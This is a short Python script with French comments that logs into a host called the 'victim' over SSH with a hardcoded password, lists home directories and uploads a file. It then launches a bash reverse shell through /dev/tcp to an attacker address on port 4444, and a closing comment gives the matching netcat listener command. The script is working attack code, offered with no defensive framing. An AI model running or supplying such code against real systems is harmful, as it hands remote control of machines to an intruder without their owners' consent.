import paramiko

hote = "192.168.1.100"
user = "victime"
mdp  = "password123"

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(hote, username=user, password=mdp)

stdin, stdout, stderr = client.exec_command("ls -la /home")
print(stdout.read().decode())

# Transfert fichier vers la cible
sftp = client.open_sftp()
sftp.put("fichier_local.txt", "/home/victime/fichier_recu.txt")
sftp.close()

# Reverse shell très basique (écoute sur port 4444 sur la cible)
client.exec_command("bash -i >& /dev/tcp/192.168.1.50/4444 0>&1 &")

client.close()
print("Commandes exécutées")

#Prérequis : pip install paramiko
#Reverseshell coté attaquant : nc -lvnp 4444